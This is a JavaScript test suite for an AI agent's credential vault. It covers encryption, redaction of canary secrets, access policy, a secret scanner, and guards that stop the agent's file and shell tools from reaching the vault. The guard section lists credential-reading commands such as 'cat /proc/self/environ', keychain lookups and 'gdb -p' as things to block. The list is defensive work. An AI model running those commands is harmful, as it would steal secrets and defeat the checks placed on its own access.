/**
 * The credential vault & broker, tested: crypto, keys, redaction, policy,
 * placeholders, scanning, guards, generation, the HTTP API under a red-team
 * reading of the threat model, and a canary pushed through the whole agent
 * loop and every sink.
 *
 * Canary values only — made-up strings shaped like secrets, never real ones.
 * Every store is under this process's own AICO_HOME (see lib/test-home.mjs),
 * and the key provider is the in-memory test one: no OS keyring item is
 * created. The one exception is a Windows DPAPI round-trip, which seals and
 * unseals a random test key in memory and creates nothing persistent.
 */

// A store of this process's own — nothing below may touch ~/.aico. Must stay first.
import { testHome } from './lib/test-home.mjs';
import fs from 'fs';
import os from 'os';
import path from 'path';
import crypto from 'crypto';
import { execFileSync } from 'child_process';

import {
  configureVault, getVault, VaultStore, memoryKeyProvider, passphraseKeyProvider, dpapiKeyProvider,
  sealRecord, openRecord, deriveKeys, newMasterKey, parseVaultFile, withFileLock,
  Redactor, variantsOf, setActiveRedactor, activeRedactor, sinkRedact, sinkRedactAccumulated,
  hostMatches, originMatches, parseOrigin, isPrivateHost, evaluateUse, isLoosening, normalizePolicy,
  SessionGrants, RateTracker, parsePlaceholders, substitutePlaceholders,
  generatePassword, generateToken, generateSshKeyPair, scanForSecrets,
  fileToolDenial, shellDenial, bindShellPlaceholders, envReference,
  HumanGrants, AuditLog, credentialList, credentialRequest, credentialGenerate, VAULT_TOOL_CLASSES,
  ToolPipeline, installVaultStages, toolDefinitions, runAgent, Session, initEventLog, persistSession,
  eventLogPath, toMarkdown, freezeHooks, resetHooks, spillResult, setSpillDir, EventHub, createRootContext,
  serve, attachVaultHostChannel, detectShell, guardAgentRun,
} from '../dist-test/test-exports.js';

let passed = 0;
let failed = 0;
const failures = [];
function assert(cond, name) {
  if (cond) { passed++; console.log(`  ✓ ${name}`); }
  else { failed++; failures.push(name); console.log(`  ✗ ${name}`); }
}
async function throwsCode(fn, code) {
  try { await fn(); return false; } catch (err) { return err?.code === code; }
}

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'aico-vault-test-'));
process.on('exit', () => { try { fs.rmSync(tmp, { recursive: true, force: true }); } catch { /* best effort */ } });

// ── canaries and a leak detector that decodes rather than pattern-matches ──

const CANARY = 'Cn4ry-S3cr3t-Value-9f8e7d6c5b';
const CANARY_SHELL = 'Sh3ll-Can4ry-7a6b5c4d3e2f1';
const ALL_CANARIES = [CANARY, CANARY_SHELL];

/** Every encoding a leak could take, applied to one value. */
function encodingsOf(v) {
  const b = Buffer.from(v);
  return [
    v, b.toString('base64'), b.toString('base64').replace(/=+$/, ''), b.toString('base64url'),
    b.toString('hex'), b.toString('hex').toUpperCase(), encodeURIComponent(v),
    JSON.stringify(v).slice(1, -1), Buffer.from(`admin:${v}`).toString('base64'),
  ];
}

/**
 * Does `text` contain a canary in any form? Checks the literal encodings,
 * then decodes every base64/hex run it can find and looks inside.
 */
function leaks(text, canaries = ALL_CANARIES) {
  if (typeof text !== 'string') text = JSON.stringify(text) ?? '';
  for (const c of canaries) {
    if (encodingsOf(c).some(e => text.includes(e))) return `literal ${c.slice(0, 6)}…`;
    for (const run of text.match(/[A-Za-z0-9+/_=-]{12,}/g) ?? []) {
      for (let skip = 0; skip < 4; skip++) {
        for (const alphabet of ['base64', 'base64url']) {
          const decoded = Buffer.from(run.slice(skip), alphabet).toString('latin1');
          if (decoded.includes(c)) return `base64 ${c.slice(0, 6)}…`;
        }
      }
    }
    for (const run of text.match(/(?:[0-9a-fA-F]{2}){8,}/g) ?? []) {
      for (const s of [run, run.slice(1)]) if (Buffer.from(s, 'hex').toString('latin1').includes(c)) return `hex ${c.slice(0, 6)}…`;
    }
    try { if (decodeURIComponent(text.replace(/\+/g, ' ')).includes(c)) return 'url-encoded'; } catch { /* malformed escapes */ }
  }
  return null;
}

// ═══════════════════════════════════════════════════════════
console.log('\n══ V1. CRYPTO: ROUND TRIP, TAMPER, WRONG KEY ══');
{
  const keys = deriveKeys(newMasterKey());
  const plain = Buffer.from(JSON.stringify({ secret: CANARY }));
  const rec = sealRecord(keys, 'cred_a', 1, plain);
  assert(!leaks(JSON.stringify(rec)), 'a sealed record holds no trace of its plaintext');
  assert(openRecord(keys, rec).equals(plain), 'seal → open round-trips');
  const rec2 = sealRecord(keys, 'cred_a', 1, plain);
  assert(rec.iv !== rec2.iv && rec.ct !== rec2.ct, 'a fresh IV every seal: same plaintext, different ciphertext');

  const flipped = { ...rec, ct: Buffer.from(rec.ct, 'base64').map((x, i) => (i === 0 ? x ^ 1 : x)).toString('base64') };
  assert(await throwsCode(() => openRecord(keys, flipped), 'tampered'), 'one flipped ciphertext bit fails authentication');
  assert(await throwsCode(() => openRecord(keys, { ...rec, id: 'cred_b' }), 'tampered'), 'a record moved to another id fails (id is in the AAD)');
  assert(await throwsCode(() => openRecord(keys, { ...rec, v: 2 }), 'tampered'), 'a record replayed at another version fails (version is in the AAD)');
  assert(await throwsCode(() => openRecord(deriveKeys(newMasterKey()), rec), 'tampered'), 'the wrong key fails authentication');
  let msg = '';
  try { openRecord(keys, flipped); } catch (e) { msg = e.message; }
  assert(!leaks(msg) && !msg.includes(rec.ct.slice(0, 12)), 'the tamper error names the record, not its contents');
  assert(await throwsCode(() => parseVaultFile(JSON.stringify({ format: 'aico-vault', version: 99, kcv: 'x', records: [], mac: 'x' })), 'format'),
    'a vault file from a newer format is refused, not guessed at');
}

console.log('\n══ V2. STORE: FILES, INTEGRITY, LOCKING ══');
{
  const dir = path.join(tmp, 'store1');
  const provider = memoryKeyProvider();
  const store = new VaultStore({ dir, keyProvider: provider });
  await store.init();
  const { credential, warnings } = store.create({ name: 'db-admin', kind: 'database', secret: { password: CANARY }, username: 'root', host: '10.0.0.5', createdBy: 'user' });
  assert(credential.name === 'db-admin' && credential.fields.includes('password') && !('secret' in credential), 'create returns metadata and field names, never the value');
  assert(warnings.length === 0, 'a long secret produces no redaction warning');
  const onDisk = fs.readFileSync(path.join(dir, 'vault.json'), 'utf8') + fs.readFileSync(path.join(dir, 'key.json'), 'utf8');
  assert(!leaks(onDisk), 'neither vault.json nor key.json contains the value in any encoding');
  assert(!onDisk.includes('db-admin') && !onDisk.includes('10.0.0.5'), 'metadata and policy are sealed too (a same-user process cannot loosen a policy by editing)');
  assert(!leaks(JSON.stringify(store.list())), 'list() carries no value');
  assert(!leaks(JSON.stringify(store.get('db-admin'))), 'get() carries no value');

  // A second store over the same files (another process) sees the write.
  const other = new VaultStore({ dir, keyProvider: provider });
  await other.unlock();
  assert(other.list().length === 1 && other.get('db-admin').username === 'root', 'a second process reads what the first wrote');
  other.create({ name: 'api', kind: 'api-token', secret: { token: 'tok-0123456789abcdef' }, createdBy: 'user' });
  assert(store.list().length === 2, 'the first process picks up the second one\'s write (re-read under the lock)');

  assert(await throwsCode(() => store.create({ name: 'DB-ADMIN', kind: 'login', secret: { password: 'x1234567' }, createdBy: 'user' }), 'exists'), 'names are unique, case-insensitively');
  assert(await throwsCode(() => store.create({ name: 'bad name', kind: 'login', secret: { password: 'x1234567' }, createdBy: 'user' }), 'invalid'), 'invalid names are refused');
  assert(await throwsCode(() => store.create({ name: 'x', kind: 'login', secret: { apiKey: 'x1234567' }, createdBy: 'user' }), 'invalid'), 'a secret field the kind does not have is refused (no smuggling secrets into odd fields)');
  assert(await throwsCode(() => store.create({ name: 'y', kind: 'login', secret: { password: 'hunter22x' }, description: 'pw is hunter22x', createdBy: 'user' }), 'invalid'), 'a value that also appears in the metadata is refused');
  const short = store.create({ name: 'pin', kind: 'generic', secret: { value: '4821' }, createdBy: 'user' });
  assert(short.warnings.length === 1 && /only where it appears on its own/.test(short.warnings[0]), 'a short secret is stored with an honest redaction warning');

  // Integrity: delete a record from the file behind the vault's back.
  const file = JSON.parse(fs.readFileSync(path.join(dir, 'vault.json'), 'utf8'));
  const backup = JSON.stringify(file);
  file.records.pop();
  fs.writeFileSync(path.join(dir, 'vault.json'), JSON.stringify(file));
  const third = new VaultStore({ dir, keyProvider: provider });
  assert(await throwsCode(() => third.unlock(), 'tampered'), 'a record removed outside AICO is detected (file MAC)');
  fs.writeFileSync(path.join(dir, 'vault.json'), backup);
  const wrongKey = new VaultStore({ dir, keyProvider: memoryKeyProvider() });
  assert(await throwsCode(() => wrongKey.unlock(), 'locked'), 'a different key provider instance cannot open it');

  // Atomic write leaves no temp files; the lock serialises and breaks stale locks.
  assert(!fs.readdirSync(dir).some(f => f.endsWith('.tmp')), 'atomic writes leave no temp files behind');
  const lockPath = path.join(dir, 'test.lock');
  fs.writeFileSync(lockPath, `${process.pid}:${Date.now()}`);
  assert(await throwsCode(() => withFileLock(lockPath, () => 1, 150), 'lock-timeout'), 'a held lock makes a second writer wait, then time out');
  fs.writeFileSync(lockPath, `999999:${Date.now() - 60_000}`);
  assert(withFileLock(lockPath, () => 42, 500) === 42 && !fs.existsSync(lockPath), 'a stale lock (dead owner) is broken, and released after use');
}

console.log('\n══ V3. KEYS: PASSPHRASE, AUTO-LOCK, NO PLAINTEXT FALLBACK ══');
{
  const dir = path.join(tmp, 'pass');
  const store = new VaultStore({ dir, keyProvider: passphraseKeyProvider, autoLockMs: 150 });
  assert(await throwsCode(() => store.init(), 'unavailable'), 'a passphrase vault cannot be created without a passphrase (no silent plaintext)');
  await store.init({ passphrase: 'correct horse battery' });
  store.create({ name: 'p1', kind: 'login', secret: { password: CANARY }, createdBy: 'user' });
  assert(!leaks(fs.readFileSync(path.join(dir, 'key.json'), 'utf8')), 'key.json holds a wrapped key and KDF parameters, not the key');
  store.lock();
  assert(await throwsCode(() => store.list(), 'locked'), 'a locked vault refuses to list');
  assert(await throwsCode(() => store.unlock({ passphrase: 'wrong passphrase' }), 'wrong-passphrase'), 'the wrong passphrase is refused');
  await store.unlock({ passphrase: 'correct horse battery' });
  assert(store.list().length === 1, 'the right passphrase unlocks');
  await new Promise(r => setTimeout(r, 300));
  assert(!store.isUnlocked(), 'an idle passphrase vault locks itself');
  assert(await store.verifyHumanPassphrase('correct horse battery') && !(await store.verifyHumanPassphrase('nope nope')), 'the passphrase verifies a human grant without unlocking');

  const injectedDir = path.join(tmp, 'inj');
  process.env.AICO_VAULT_KEY_PROVIDER = 'injected';
  const inj = new VaultStore({ dir: injectedDir });
  assert(await throwsCode(() => inj.init(), 'locked'), 'an injected-key vault is not created until the host hands the key over');
  delete process.env.AICO_VAULT_KEY_PROVIDER;

  if (process.platform === 'win32' && process.env.AICO_TEST_DPAPI !== '0') {
    // Protect/Unprotect of a random key in memory; creates nothing persistent.
    const key = newMasterKey();
    try {
      const sealed = await dpapiKeyProvider.seal(key, { vaultId: 'test' });
      assert(!sealed.sealed.includes(key.toString('base64')), 'DPAPI: the sealed blob is not the key');
      const back = await dpapiKeyProvider.unseal({ provider: 'dpapi', ...sealed }, { vaultId: 'test' });
      assert(back.equals(key), 'DPAPI: seal → unseal round-trips through a PowerShell child (key over stdin, never argv)');
    } catch (err) {
      assert(false, `DPAPI round-trip failed: ${err.message}`);
    }
  }
}

console.log('\n══ V4. REDACTION: ENCODINGS, STREAMS, SHORT SECRETS, FALSE POSITIVES ══');
{
  const pem = [
    '-----BEGIN OPENSSH PRIVATE KEY-----',
    'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW',
    'QyNTUxOQAAACBDanaryKeyLineNumberTwoThatIsDefinitelyNotRealAtAll0000000',
    '-----END OPENSSH PRIVATE KEY-----',
  ].join('\n');
  const r = new Redactor([{ name: 'db', values: [CANARY] }, { name: 'key', values: [pem] }, { name: 'pin', values: ['4821'] }, { name: 'tiny', values: ['ab1'] }]);

  const adversarial = [
    CANARY,
    Buffer.from(CANARY).toString('base64'),
    Buffer.from(CANARY).toString('base64url'),
    Buffer.from(`admin:${CANARY}`).toString('base64'),               // Basic auth header
    Buffer.from(`x${CANARY}yz`).toString('base64'),                  // alignment 1
    Buffer.from(`xy${CANARY}z`).toString('base64'),                  // alignment 2
    Buffer.from(`{"password":"${CANARY}"}`).toString('base64url'),
    Buffer.from(CANARY).toString('hex'),
    Buffer.from(CANARY).toString('hex').toUpperCase(),
    encodeURIComponent(CANARY),
    `postgres://root:${encodeURIComponent(CANARY)}@10.0.0.5/db`,
    JSON.stringify({ nested: { password: CANARY } }),
    `'${CANARY.replace(/'/g, `'\\''`)}'`,
  ];
  for (const text of adversarial) {
    const out = r.redact(`before ${text} after`);
    assert(!leaks(out, [CANARY]) && out.includes('[secret:db]'), `redacted: ${text.slice(0, 40)}…`);
  }

  const crlf = pem.replace(/\n/g, '\r\n');
  assert(!r.redact(`key:\n${pem}\n`).includes('Q2FuYXJ5') && r.redact(pem).includes('[secret:key]'), 'a multi-line key is redacted whole');
  assert(r.redact(crlf).includes('[secret:key]'), 'the same key with CRLF line endings is redacted');
  assert(r.redact(`partial: ${pem.split('\n')[2]}`).includes('[secret:key]'), 'a single line of the key, printed alone, is redacted');
  assert(r.redact(JSON.stringify({ k: pem })).includes('[secret:key]'), 'the key JSON-escaped (\\n) is redacted');

  assert(r.redact('PIN 4821 entered') === 'PIN [secret:pin] entered', 'a 4-char secret standing alone is redacted');
  assert(r.redact('ts=1648213482193 id=48213') === 'ts=1648213482193 id=48213', 'a 4-char secret inside a longer number is left alone');
  assert(r.redact('code ab1 here') === 'code ab1 here', 'under 4 characters nothing is redacted (documented)');
  assert(variantsOf('4821').length === 1 && variantsOf('ab1').length === 0, 'short secrets index raw only; tiny ones not at all');

  const ordinary = 'npm install ok\n commit 3f786850e387550fdab836ed7e6dc881de23001b uuid 123e4567-e89b-12d3-a456-426614174000 '
    + 'integrity sha512-abcDEF0123456789+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJ== data:image/png;base64,iVBORw0KGgoAAAANSUhEUg';
  assert(r.redact(ordinary) === ordinary, 'ordinary output (SHAs, UUIDs, integrity hashes, images) is untouched');

  // Streaming: every split point of a text carrying the secret twice.
  const text = `start ${CANARY} middle ${Buffer.from(CANARY).toString('base64')} end`;
  let allSplitsSafe = true;
  for (let i = 1; i < text.length; i++) {
    const s = r.stream();
    const out = s.push(text.slice(0, i)) + s.push(text.slice(i)) + s.flush();
    if (leaks(out, [CANARY]) || out !== r.redact(text)) { allSplitsSafe = false; break; }
  }
  assert(allSplitsSafe, 'streaming: a secret split at ANY chunk boundary is still caught, and the output equals whole-text redaction');
  let byteByByte = '';
  const s2 = r.stream();
  for (const ch of text) byteByByte += s2.push(ch);
  byteByByte += s2.flush();
  assert(byteByByte === r.redact(text), 'streaming one character at a time gives the same result');

  // Accumulated (onChunk contract): a growing prefix of the secret is never shown.
  let prefixShown = false;
  for (let i = 1; i <= CANARY.length; i++) {
    const shown = r.redactAccumulated(`answer: ${CANARY.slice(0, i)}`);
    if (i >= 8 && shown.includes(CANARY.slice(0, i))) prefixShown = true;
  }
  assert(!prefixShown, 'accumulated streaming never displays a growing prefix of a secret');
  assert(r.redactAccumulated(`answer: ${CANARY}.`) === 'answer: [secret:db].', 'once complete, accumulated text is redacted in place');

  const obj = { a: 1, b: ['x', { c: CANARY }], d: 'fine' };
  const red = r.redactDeep(obj);
  assert(red.b[1].c === '[secret:db]' && red.a === 1 && red.d === 'fine' && obj.b[1].c === CANARY, 'redactDeep rewrites nested values without mutating the input');
  const clean = { a: 'nothing here' };
  assert(r.redactDeep(clean) === clean, 'redactDeep returns the same object when nothing changed');
  assert(Redactor.EMPTY.redact(CANARY) === CANARY, 'an empty index is the identity');

  const big = 'x'.repeat(2_000_000) + CANARY;
  const t0 = Date.now();
  const bigOut = r.redact(big);
  assert(bigOut.endsWith('[secret:db]') && Date.now() - t0 < 3000, `2 MB redacted in ${Date.now() - t0}ms (linear pass)`);
}

console.log('\n══ V5. POLICY: HOSTS, ORIGINS, LAN HTTP, EXPIRY, RATE, APPROVAL ══');
{
  assert(hostMatches('10.0.0.5', '10.0.0.5') && !hostMatches('10.0.0.5', '10.0.0.6'), 'exact host');
  assert(hostMatches('*.corp.example', 'a.b.corp.example') && !hostMatches('*.corp.example', 'corp.example') && !hostMatches('*.corp.example', 'evilcorp.example'), 'wildcard is subdomains only, never a look-alike suffix');
  assert(hostMatches('10.0.0.0/24', '10.0.0.77') && !hostMatches('10.0.0.0/24', '10.0.1.1'), 'CIDR ranges');
  assert(hostMatches('10.0.0.5:22', '10.0.0.5', 22) && !hostMatches('10.0.0.5:22', '10.0.0.5', 2222), 'a :port on the pattern must match');
  assert(hostMatches('Server.LAN.', 'server.lan'), 'hosts compare case-insensitively, trailing dot ignored');
  assert(originMatches('https://10.0.0.5:8443', 'https://10.0.0.5:8443/login') && !originMatches('https://10.0.0.5:8443', 'http://10.0.0.5:8443'), 'origins: scheme must match exactly');
  assert(originMatches('https://*.example.com', 'https://app.example.com') && !originMatches('https://*.example.com', 'https://example.com.evil.io'), 'origin wildcard hosts');
  assert(parseOrigin('https://user:pw@evil.example') === undefined, 'userinfo in an origin is refused (look-alike trick)');
  assert(originMatches('https://example.com', 'https://example.com:443') && !originMatches('https://example.com', 'https://example.com:8443'), 'default ports are applied; others must match');
  assert(isPrivateHost('192.168.1.10') && isPrivateHost('nas.local') && isPrivateHost('::1') && !isPrivateHost('8.8.8.8') && !isPrivateHost('example.com'), 'private/LAN detection');

  const now = 1_000_000;
  const state = () => ({ grants: new SessionGrants(), rate: new RateTracker(), now });
  const meta = (extra = {}) => ({ id: 'c1', name: 'svc', kind: 'login', tags: [], createdBy: 'user', createdAt: 0, updatedAt: 0, ...extra });
  const pol = (extra = {}) => normalizePolicy(extra, { allowedHosts: [], allowedOrigins: [], allowedTools: [], approval: 'session', allowShell: false });

  const lanHttp = pol({ allowedOrigins: ['http://10.0.0.5:8080'] });
  assert(evaluateUse(meta(), lanHttp, { tool: 'Browser', origin: 'http://10.0.0.5:8080', purpose: 'login' }, state()).allowed, 'explicit http:// origin on a LAN address is allowed');
  const pubHttp = pol({ allowedOrigins: ['http://example.com'] });
  assert(!evaluateUse(meta(), pubHttp, { tool: 'Browser', origin: 'http://example.com', purpose: 'login' }, state()).allowed, 'plain http to a public host is refused without allowInsecureHttp');
  assert(evaluateUse(meta(), pol({ allowedOrigins: ['http://example.com'], allowInsecureHttp: true }), { tool: 'Browser', origin: 'http://example.com', purpose: 'x' }, state()).allowed, '...and allowed with it');
  const httpsOnly = pol({ allowedOrigins: ['https://10.0.0.5:8443'] });
  assert(!evaluateUse(meta(), httpsOnly, { tool: 'Browser', origin: 'http://10.0.0.5:8443', purpose: 'x' }, state()).allowed, 'https binding does not admit http on the same host (never inferred)');
  const bound = meta({ host: '10.0.0.5' });
  assert(evaluateUse(bound, pol(), { tool: 'SSH', host: '10.0.0.5', purpose: 'x' }, state()).allowed, 'a credential\'s own host is its default scope');
  const off = evaluateUse(bound, pol(), { tool: 'SSH', host: '10.0.0.6', purpose: 'x' }, state());
  assert(!off.allowed && /not bound to 10.0.0.6/.test(off.reason), 'using it elsewhere is refused with a reason');
  assert(!evaluateUse(bound, pol({ expiresAt: now - 1 }), { tool: 'SSH', host: '10.0.0.5', purpose: 'x' }, state()).allowed, 'expired credentials cannot be used');
  assert(!evaluateUse(bound, pol({ allowedTools: ['SSH'] }), { tool: 'HTTP', host: '10.0.0.5', purpose: 'x' }, state()).allowed, 'allowedTools restricts the consumer');
  const rateState = state();
  const rated = pol({ rateLimit: { max: 2, perSeconds: 60 } });
  for (let i = 0; i < 2; i++) rateState.rate.record('c1', now);
  assert(!evaluateUse(bound, rated, { tool: 'SSH', host: '10.0.0.5', purpose: 'x' }, rateState).allowed, 'rate limit refuses the use past its budget');

  const shellOff = evaluateUse(bound, pol(), { tool: 'Bash', purpose: 'x' }, state());
  assert(!shellOff.allowed && /not allowed in shell/.test(shellOff.reason), 'shell use is off by default');
  const shellOn = evaluateUse(bound, pol({ allowShell: true, approval: 'auto' }), { tool: 'Bash', purpose: 'x' }, state());
  assert(shellOn.allowed && shellOn.needsApproval && shellOn.mode === 'every-use', 'shell use asks a person every time, even when approval is auto');
  assert(!evaluateUse(bound, pol({ allowShell: true, shellApproval: 'auto' }), { tool: 'Bash', purpose: 'x' }, state()).needsApproval, '...unless a human set shellApproval: auto');
  const sess = state();
  const first = evaluateUse(bound, pol(), { tool: 'SSH', host: '10.0.0.5', purpose: 'x', sessionId: 's1' }, sess);
  sess.grants.add('c1', 'SSH', 's1');
  const second = evaluateUse(bound, pol(), { tool: 'SSH', host: '10.0.0.5', purpose: 'x', sessionId: 's1' }, sess);
  const otherSession = evaluateUse(bound, pol(), { tool: 'SSH', host: '10.0.0.5', purpose: 'x', sessionId: 's2' }, sess);
  assert(first.needsApproval && !second.needsApproval && otherSession.needsApproval, 'session approval: asked once per session, per tool');
  assert(evaluateUse(bound, pol({ approval: 'auto' }), { tool: 'SSH', host: '10.0.0.5', purpose: 'x' }, state()).needsApproval === false, 'auto within scope needs no prompt');
  assert(evaluateUse(meta(), pol({ approval: 'session' }), { tool: 'SSH', host: 'any', purpose: 'x' }, state()).mode === 'every-use', 'an unscoped credential asks every use');

  const base = pol({ allowedHosts: ['10.0.0.5'], approval: 'session' });
  assert(isLoosening(base, pol({ allowedHosts: ['10.0.0.5', '10.0.0.6'], approval: 'session' })), 'adding a host is a loosening');
  assert(isLoosening(base, { ...base, approval: 'auto' }) && isLoosening(base, { ...base, allowShell: true }) && isLoosening(base, { ...base, allowedHosts: [] }), 'auto, shell, and dropping the host list are loosenings');
  assert(!isLoosening(base, { ...base, approval: 'every-use' }) && !isLoosening(base, { ...base, expiresAt: now }), 'tightening is not');
}

console.log('\n══ V6. PLACEHOLDERS ══');
{
  const refs = parsePlaceholders('mysql -p{{secret:db}} -u {{ secret:db.username }} {{secret:api.token}} {{secret:bad name}}');
  assert(refs.length === 3 && refs[0].name === 'db' && !refs[0].field && refs[2].field === 'token', 'parses name and name.field, ignores invalid names');
  const out = await substitutePlaceholders('a={{secret:x}} b={{secret:x}} c={{secret:y.f}}', async (r) => `<${r.name}${r.field ?? ''}>`);
  assert(out === 'a=<x> b=<x> c=<yf>', 'substitution resolves each distinct reference once');

  const kind = detectShell().kind;
  const bound = await bindShellPlaceholders(`curl -u 'admin:{{secret:x}}' "https://h/?p={{secret:x}}" {{secret:y}}`, async (r) => `val-${r.name}`, kind);
  assert(!bound.command.includes('val-x') && Object.values(bound.env).includes('val-x') && Object.keys(bound.env).length === 2,
    `shell binding puts values in the child's environment, not the command (${kind})`);
  assert(envReference('git-bash', 'single', 'V') === `'"\${V}"'` && envReference('posix', 'none', 'V') === '"${V}"', 'variable references are quoted for their context');
}

console.log('\n══ V7. SCANNER: POSITIVES AND REAL-LOOKING NEGATIVES ══');
{
  const gh = 'ghp_' + 'Q'.repeat(10) + 'z9Y8x7W6v5U4t3S2r1Q0p9O8n7M6';
  const positives = [
    [`here is my token ${gh}`, 'github-token'],
    ['key AKIA' + 'IOSFODNN7EXAMPLE' + ' for aws', 'aws-access-key-id'],
    ['-----BEGIN RSA PRIVATE KEY-----\nMIIEow' + 'IBAAKCAQEAcanary\n-----END RSA PRIVATE KEY-----', 'private-key'],
    ['use sk-ant-api03-' + 'a'.repeat(30) + 'B1', 'anthropic-key'],
    ['OPENAI=sk-proj-' + 'Ab1'.repeat(12), 'openai-key'],
    ['stripe sk_live_' + 'x'.repeat(24), 'stripe-key'],
    ['slack xoxb-1234567890-abcdefghij', 'slack-token'],
    ['google AIza' + 'S'.repeat(35), 'google-api-key'],
    ['connect to postgres://admin:Hunter2x!@10.0.0.5:5432/app', 'url-password'],
    ['the root password is Tr0ub4dor&3', 'password'],
    ['PASSWORD="n0t-A-r3al-one"', 'password'],
    ['{"api_key": "abc123XYZ789def"}', 'api-key'],
  ];
  for (const [text, label] of positives) {
    const found = scanForSecrets(text);
    assert(found.length === 1 && found[0].label === label, `detects ${label}`);
  }
  const url = scanForSecrets('postgres://admin:Hunter2x!@10.0.0.5:5432/app')[0];
  assert(url.value === 'Hunter2x!' && url.host === '10.0.0.5' && url.username === 'admin' && url.kind === 'database', 'a URL credential yields only the password, with its host and user');

  const negatives = [
    'commit 3f786850e387550fdab836ed7e6dc881de23001b fixed it',
    'id 123e4567-e89b-12d3-a456-426614174000',
    '"integrity": "sha512-wV9mBdDwN8CzqPKkDy7Dq4nL8H2O9F4gqRjwTLwhdmRmbjmOeUuHgQIRhW8x8V6rKc8F1uCv5LGkdU4E5kfk4w=="',
    'img data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
    'the token is expired, please refresh',
    'set the password field to required',
    'API_KEY = os.environ["API_KEY"]',
    'const token = req.headers.authorization',
    'password: ${{ secrets.DB_PASSWORD }}',
    'password=<your-password>',
    'token: DB_TOKEN_NAME',
    'git clone https://github.com/org/repo.git',
    'ssh://git@github.com:22/org/repo',
    'password = "changeme"',
    // Found live: a reference in the user's own message is a name, not a secret.
    'run: node -e "x" {{secret:canary-shell}} and echo {{ secret:api.token }}',
    'the output showed secret: [secret:canary-db] everywhere',
  ];
  for (const n of negatives) assert(scanForSecrets(n).length === 0, `no false positive: ${n.slice(0, 44)}`);
}

console.log('\n══ V8. GUARDS ══');
{
  const vaultDir = path.join(testHome, 'vault');
  const cwd = testHome;
  assert(fileToolDenial('Read', { file_path: path.join(vaultDir, 'vault.json') }, vaultDir, cwd), 'Read of the vault file is denied');
  assert(fileToolDenial('Read', { file_path: 'vault/key.json' }, vaultDir, cwd), 'a relative path into the vault is denied');
  assert(fileToolDenial('Grep', { pattern: 'x', path: vaultDir }, vaultDir, cwd), 'Grep over the vault directory is denied');
  assert(fileToolDenial('Glob', { pattern: '~/.aico/vault/*.json' }, vaultDir, cwd), 'a Glob pattern naming the vault is denied');
  assert(fileToolDenial('Write', { file_path: path.join(vaultDir, 'vault.json'), content: '' }, vaultDir, cwd), 'writing the vault file is denied');
  assert(!fileToolDenial('Read', { file_path: path.join(testHome, 'settings.json') }, vaultDir, cwd), 'files outside the vault are unaffected');
  assert(!fileToolDenial('Read', { file_path: path.join(testHome, 'vault-notes.md') }, vaultDir, cwd), 'a sibling named like the vault is not caught (prefix, not substring)');

  const blocked = [
    'cat ~/.aico/vault/vault.json', 'type %USERPROFILE%\\.aico\\vault\\key.json', 'security find-generic-password -s "AICO credential vault" -w',
    'secret-tool lookup service aico-vault', 'powershell "[Security.Cryptography.ProtectedData]::Unprotect($b,$null,0)"',
    'cat /proc/1234/environ', 'cat /proc/self/environ | tr "\\0" "\\n"', 'aico vault show db-admin', 'cmdkey /list', `cat ${vaultDir}/vault.json`,
    'gdb -p 4242', 'echo $AICO_VAULT_KEY',
  ];
  for (const c of blocked) assert(!!shellDenial(c, vaultDir), `shell guard blocks: ${c.slice(0, 50)}`);
  for (const c of ['npm test', 'git status', 'cat package.json', 'ssh admin@10.0.0.5 uptime', 'aico vault list']) {
    assert(!shellDenial(c, vaultDir), `shell guard allows: ${c}`);
  }
}

console.log('\n══ V9. GENERATION ══');
{
  const pw = generatePassword();
  assert(pw.length === 24 && /[a-z]/.test(pw) && /[A-Z]/.test(pw) && /\d/.test(pw) && /[^A-Za-z0-9]/.test(pw), 'default password: 24 chars, every class');
  assert(!/[0O1lI'"`$\\ ]/.test(generatePassword({ length: 200 })), 'no look-alikes, quotes, $, backslash or spaces by default');
  assert(/^[A-Za-z0-9]{40}$/.test(generatePassword({ length: 40, symbols: false })), 'symbols can be turned off');
  assert(new Set(Array.from({ length: 50 }, () => generatePassword())).size === 50, 'fifty passwords, fifty different values');
  assert(generateToken(32).length === 43 && /^[0-9a-f]{64}$/.test(generateToken(32, 'hex')), 'tokens: base64url and hex');

  const pair = generateSshKeyPair('admin@10.0.0.5');
  assert(pair.publicKey.startsWith('ssh-ed25519 AAAAC3NzaC1lZDI1NTE5') && pair.publicKey.endsWith(' admin@10.0.0.5'), 'OpenSSH public key line');
  assert(/^SHA256:[A-Za-z0-9+/]{43}$/.test(pair.fingerprint), 'SHA256 fingerprint');
  assert(pair.privateKey.startsWith('-----BEGIN OPENSSH PRIVATE KEY-----\n') && pair.privateKey.endsWith('-----END OPENSSH PRIVATE KEY-----\n'), 'OpenSSH private key armour');
  // Structure check without ssh-keygen: seed and public key inside the private section sign/verify.
  const body = Buffer.from(pair.privateKey.split('\n').slice(1, -2).join(''), 'base64');
  assert(body.subarray(0, 15).toString('latin1') === 'openssh-key-v1\0', 'openssh-key-v1 magic');
  const pubBlob = Buffer.from(pair.publicKey.split(' ')[1], 'base64');
  const pubRaw = pubBlob.subarray(pubBlob.length - 32);
  // The private blob is seed(32) || pub(32); its pub is the last copy in the body.
  const idx = body.lastIndexOf(pubRaw);
  const seed = body.subarray(idx - 32, idx);
  const priv = crypto.createPrivateKey({ key: { kty: 'OKP', crv: 'Ed25519', d: seed.toString('base64url'), x: pubRaw.toString('base64url') }, format: 'jwk' });
  const sig = crypto.sign(null, Buffer.from('m'), priv);
  assert(crypto.verify(null, Buffer.from('m'), crypto.createPublicKey({ key: { kty: 'OKP', crv: 'Ed25519', x: pubRaw.toString('base64url') }, format: 'jwk' }), sig), 'the private key\'s seed matches its public key (sign/verify)');
  let keygen;
  try { keygen = execFileSync('ssh-keygen', ['-?'], { stdio: 'pipe' }); } catch (e) { keygen = e.stderr?.length ? 'present' : undefined; }
  if (keygen) {
    const f = path.join(tmp, 'id_test');
    fs.writeFileSync(f, pair.privateKey, { mode: 0o600 });
    try {
      const derived = execFileSync('ssh-keygen', ['-y', '-f', f], { stdio: ['ignore', 'pipe', 'pipe'] }).toString().trim();
      assert(derived.split(' ').slice(0, 2).join(' ') === pair.publicKey.split(' ').slice(0, 2).join(' '), 'ssh-keygen reads the private key and derives the same public key');
    } catch (e) {
